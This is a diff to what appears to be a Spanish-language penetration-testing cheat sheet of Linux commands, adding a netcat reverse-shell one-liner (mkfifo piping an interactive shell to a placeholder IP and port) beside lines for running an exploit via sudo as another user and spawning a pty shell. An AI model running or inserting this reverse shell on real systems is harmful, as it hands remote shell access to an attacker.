@@ -208,6 +208,8 @@ sudo -u (usuario) /usr/bin/python /direccion/exploit.py [ejecuta exploit.py como
 
 python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]
 
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc IP PUERTO >/tmp/f [para invocar una shell de tipo pipe]
+
 printenv (variable) [sirve para mostrar variables de entorno del sistema]
 
 uname -r [muestra la versión del kernel de Linux que está corriendo en el sistema]
